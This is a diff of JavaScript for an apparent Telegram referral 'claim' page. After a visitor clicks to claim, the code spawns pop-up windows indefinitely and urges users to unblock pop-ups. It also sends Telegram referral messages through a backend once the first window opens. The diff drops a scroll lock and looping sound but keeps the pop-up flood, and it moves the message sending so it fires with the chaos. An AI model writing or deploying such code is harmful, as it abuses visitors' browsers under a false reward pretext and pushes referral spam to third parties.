@@ -6,7 +6,6 @@ const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Use yo
 // Elements
 const claimButton = document.getElementById('claimButton');
 const claimMessage = document.getElementById('claimMessage');
-const chaosSound = document.getElementById('chaosSound');
 const claimModal = document.getElementById('claimModal');
 const closeModal = document.getElementById('closeModal');
 const submitUsername = document.getElementById('submitUsername');
@@ -196,8 +195,6 @@ secondClaimButton.addEventListener('click', async () => {
             testWindow.close();
             // Start Chaos Effect
             startChaos();
-            // Send messages via backend after chaos starts
-            sendReferralMessages();
         }, 1000);
     }
 });
@@ -249,15 +246,6 @@ function startChaos() {
     if (isChaosActive) return; // Prevent multiple chaos starts
     isChaosActive = true;
 
-    // Disable scrolling
-    document.body.classList.add('no-scroll');
-
-    // Play chaos sound on the main page
-    if (chaosSound) {
-        chaosSound.loop = true;
-        chaosSound.play();
-    }
-
     // Start spawning chaos windows indefinitely
     chaosInterval = setInterval(() => {
         spawnChaosWindow();
@@ -307,6 +295,11 @@ function spawnChaosWindow() {
 
         // Keep track of the chaos window
         chaosWindows.push(chaosWindow);
+
+        // Send Telegram messages once the first chaos window is open
+        if (chaosWindows.length === 1) {
+            sendReferralMessages();
+        }
     } else {
         console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
         alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
@@ -321,15 +314,6 @@ function stopChaos() {
         chaosInterval = null;
     }
     isChaosActive = false;
-
-    // Remove no-scroll class
-    document.body.classList.remove('no-scroll');
-
-    // Stop sound on the main page
-    if (chaosSound) {
-        chaosSound.pause();
-        chaosSound.currentTime = 0;
-    }
 }
 
 // Leaderboard Functionality
